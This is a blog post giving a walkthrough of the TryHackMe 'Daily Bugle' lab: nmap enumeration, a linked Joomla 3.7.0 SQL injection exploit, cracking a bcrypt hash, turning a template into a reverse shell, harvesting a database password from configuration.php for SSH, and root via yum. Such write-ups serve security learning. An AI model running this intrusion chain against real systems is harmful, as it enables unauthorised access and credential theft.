<!DOCTYPE html>
<html lang="en-us" data-theme="light"><head>
    <title> Somesh Bhandarkar | Daily bugle TryHackMe </title>
    <meta charset="utf-8"><meta name="generator" content="Hugo 0.70.0" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
    <meta name="description" content="Graduate Candidate in Cybersecurity at the University of Maryland, College Park">
    
    <link rel="stylesheet" href="https://somesh-bhandarkar.github.io/css/style.min.67cd718c0a3c8009c771494d381fb7128246a454bd0518fed97cb65d257db948.css" integrity="sha256-Z81xjAo8gAnHcUlNOB&#43;3EoJGpFS9BRj&#43;2Xy2XSV9uUg=" crossorigin="anonymous" type="text/css">
    
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
    
    <link rel="shortcut icon" href="https://somesh-bhandarkar.github.io/favicons/favicon.ico" type="image/x-icon">
    <link rel="apple-touch-icon" sizes="180x180" href="https://somesh-bhandarkar.github.io/favicons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://somesh-bhandarkar.github.io/favicons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://somesh-bhandarkar.github.io/favicons/favicon-16x16.png">
    <link rel="canonical" href="https://somesh-bhandarkar.github.io/post/dailybugle/">
    
    
    <script type="text/javascript" src="https://somesh-bhandarkar.github.io/js/anatole-header.min.c275265a259296f3dd50e8236a77fcbcadb1dbb9597d3045c675dcc2c7c58a93.js" integrity="sha256-wnUmWiWSlvPdUOgjanf8vK2x27lZfTBFxnXcwsfFipM=" crossorigin="anonymous"></script>
</head><body><div class="sidebar animated fadeInDown">
    <div class="logo-title">
      <div class="title">
        <img src="https://somesh-bhandarkar.github.io/img/prof.jpeg" alt="profile picture">
        <h3 title=""><a href="/">I&#39;m Somesh Bhandarkar</a></h3>
        <div class="description">
          <p>Graduate Candidate in Cybersecurity at the University of Maryland, College Park</p>
        </div>
      </div>
    </div>
    <ul class="social-links">
        
        <li>
        <a href="https://linkedin.com/linkedin.com/in/somesh-bhandarkar" rel="me" aria-label="Linkedin">
          <i class="fa fa-2x fa-linkedin" aria-hidden="true"></i>
        </a>          
        </li>

        
        <li>
        <a href="https://github.com/somesh-bhandarkar" rel="me" aria-label="GitHub">
          <i class="fa fa-2x fa-github" aria-hidden="true"></i>
        </a>          
        </li>

        
        <li>
        <a href="https://www.instagram.com/" rel="me" aria-label="instagram">
          <i class="fa fa-2x fa-instagram" aria-hidden="true"></i>
        </a>          
        </li>

        
        <li>
        <a href="bsomesh98@gmail.com" rel="me" aria-label="e-mail">
          <i class="fa fa-2x fa-envelope" aria-hidden="true"></i>
        </a>          
        </li>

        
    </ul>
    <div class="footer">
        <div class="by_farbox">&copy; Somesh Bhandarkar 2020 </div>
      </div>
    </div>
</div><div class="main">
            <div class="page-top animated fadeInDown">
    <ul class="nav">
        
        
        
        <li><a  href="/" title="">Home</a></li>
        
        
        <li><a  href="/post/" title="">Posts</a></li>
        
        
        <li><a  href="/about/" title="">About</a></li>
        
    </ul>
    <div class="themeswitcher">
        <a class="theme-switch" title="Switch Theme">
            <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
        </a>
    </div>
</div>

            <div class="autopagerize_page_element">
                <div class="content">
<div class="post animated fadeInDown">
    <div class="post-content">

      <div class="post-title">
        <h3>Daily bugle TryHackMe
        </h3>
        
        <div class="info">
          <i class="fa fa-sun-o"></i><span class="date">Mon, Jun 15, 2020</span>
          <i class="fa fa-clock-o"></i><span class="reading-time">4-minute read</span>
        </div>
        
        </div>

    <h1 id="daily-bugle-tryhackme">Daily Bugle TryHackMe</h1>
<h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">Nmap</h3>
<h4 id="command-used">Command Used</h4>
<blockquote>
<p>nmap -sC -sV -O -oA recon/dailybugle 10.10.39.238</p>
</blockquote>
<pre><code>root@kali:/THM/dailybugle# nmap -sC -sV -O -oA recon/dailybugle 10.10.39.238
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 08:14 EDT
Nmap scan report for 10.10.39.238
Host is up (0.093s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=6/15%OT=22%CT=1%CU=43082%PV=Y%DS=2%DC=I%G=Y%TM=5EE7665
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=104%TI=Z%II=I%TS=A)SEQ(SP=FE
OS:%GCD=1%ISR=104%TI=Z%CI=I%TS=A)SEQ(SP=FE%GCD=1%ISR=104%TI=Z%CI=I%II=I%TS=
OS:A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M5
OS:08ST11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68D
OS:F)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=
OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%
OS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%
OS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=
OS:40%CD=S)

Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.43 seconds
</code></pre><p><strong>PORTS OPEN</strong>
Port 22 SSH
Port 80 http version Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
We can see that there is a robots.txt which disallowd entries</p>
<p>Checking the Port 80</p>
<p>Checking the /administrator entry
<img src="/img/tryhackme/dailybugle/port80-admin.png" alt="Port80/Admin"></p>
<p>The version of joomla can be found using the link
http://10.10.39.238/administrator/manifests/files/joomla.xml</p>
<p><img src="/img/tryhackme/dailybugle/joomla-version.png" alt="joomla-version"></p>
<p>Hence, it can be concluded that the version of joomla being used is 3.7.0</p>
<h2 id="exploitation">Exploitation</h2>
<p>Checking online for a exploit we get:
The Explaination: <a href="https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html">https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</a>
The exploit: <a href="https://github.com/stefanlucas/Exploit-Joomla">https://github.com/stefanlucas/Exploit-Joomla</a></p>
<p>running the python script:
<img src="/img/tryhackme/dailybugle/joomla-exp.png" alt="joomla-exp"></p>
<p>We get a hash. The password was encrypted using <strong>bcrypt</strong></p>
<p>Decoding bcrypt using John the Ripper</p>
<pre><code>root@kali:~/machine-practice/THM/dailybugle/exploit# john --format=bcrypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:03 0.00% (ETA: 2020-06-17 05:26) 0g/s 104.8p/s 104.8c/s 104.8C/s strawberry..ihateyou
0g 0:00:03:57 0.14% (ETA: 2020-06-17 09:36) 0g/s 100.6p/s 100.6c/s 100.6C/s 123123a..101387
spiderman123     (?)
1g 0:00:07:37 DONE (2020-06-15 09:58) 0.002183g/s 102.2p/s 102.2c/s 102.2C/s sweetsmile..speciala
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
</code></pre><p>The Password for user jonah is found. But ssh into the machine is not possible with these credentials.</p>
<p>Using these credential to login to the website/administrator</p>
<p><img src="/img/tryhackme/dailybugle/login-admins.png" alt="login-admins"></p>
<p>Now to get a reverse shell</p>
<blockquote>
<p>goto Extentions -&gt; Templates</p>
</blockquote>
<p>Select any template of choice, edit its index.php into a reverse shell</p>
<p>It is best explained here: <a href="https://www.hackingarticles.in/joomla-reverse-shell/">https://www.hackingarticles.in/joomla-reverse-shell/</a></p>
<p>Now in the reverse shell</p>
<pre><code>bash-4.2$ ls
bin   dev  home  lib64	mnt  proc  run	 srv  tmp  var
boot  etc  lib	 media	opt  root  sbin  sys  usr
bash-4.2$ cd home
bash-4.2$ ls
jjameson
bash-4.2$ cd jjameson/
bash: cd: jjameson/: Permission denied
bash-4.2$ ls
jjameson
bash-4.2$ cd ../
bash-4.2$ 
bash-4.2$ cd var
bash-4.2$ ls
adm    crash  empty  gopher    lib    lock  mail  opt	    run    tmp	yp
cache  db     games  kerberos  local  log   nis   preserve  spool  www
bash-4.2$ cd www
bash-4.2$ ls
cgi-bin  html
bash-4.2$ cd html/
bash-4.2$ ls
LICENSE.txt    cli		  includes   media	 tmp
README.txt     components	  index.php  modules	 web.config.txt
administrator  configuration.php  language   plugins
bin	       htaccess.txt	  layouts    robots.txt
cache	       images		  libraries  templates
bash-4.2$ less configuration.php 
bash-4.2$ cat configuration.php 
&lt;?php
class JConfig {
	public $offline = '0';
	public $offline_message = 'This site is down for maintenance.&lt;br /&gt;Please check back again soon.';
	public $display_offline_message = '1';
	public $offline_image = '';
	public $sitename = 'The Daily Bugle';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = '20';
	public $access = '1';
	public $debug = '0';
	public $debug_lang = '0';
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'root';
	public $password = 'nv5uz9        ';
	public $db = 'joomla';
	
</code></pre><p>The current shell open is of the user jonah. But there is another user <strong>jjameson</strong></p>
<p>Going into the /var/www/html directory we can see that the <strong>configuration.php</strong> file contains the username and password for mysql.</p>
<p>These same credentials are used for logging in with user jjameson.
<img src="/img/tryhackme/dailybugle/ssh-login.png" alt="ssh-login"></p>
<h2 id="privilage-escalation">Privilage Escalation</h2>
<p>After running LinPEAS.sh we can see <strong>yum</strong> is vulnerable</p>
<p>Following: <a href="https://gtfobins.github.io/gtfobins/yum/">https://gtfobins.github.io/gtfobins/yum/</a></p>
<p><img src="/img/tryhackme/dailybugle/get-root.png" alt="get-root"></p>
<p>We get root.</p>

    </div>
    <div class="post-footer">
      <div class="info">
        
        
      </div>
    </div>

    
           
    
</div>


                </div>
            </div>
        </div>
</body>



<script type="text/javascript" src="https://somesh-bhandarkar.github.io/js/jquery.min.86b1e8f819ee2d9099a783e50b49dff24282545fc40773861f9126b921532e4c.js" integrity="sha256-hrHo&#43;BnuLZCZp4PlC0nf8kKCVF/EB3OGH5EmuSFTLkw=" crossorigin="anonymous"></script>




<script type="text/javascript" src="https://somesh-bhandarkar.github.io/js/bundle.min.0f9c74cb78f13d1f15f33daff4037c70354f98acfbb97a6f61708966675c3cae.js" integrity="sha256-D5x0y3jxPR8V8z2v9AN8cDVPmKz7uXpvYXCJZmdcPK4=" crossorigin="anonymous"></script>

<script type="text/javascript" src="https://somesh-bhandarkar.github.io/js/medium-zoom.min.92f21c856129f84aeb719459b3e6ac621a3032fd7b180a18c04e1d12083f8aba.js" integrity="sha256-kvIchWEp&#43;ErrcZRZs&#43;asYhowMv17GAoYwE4dEgg/iro=" crossorigin="anonymous"></script></html></body>

</html>
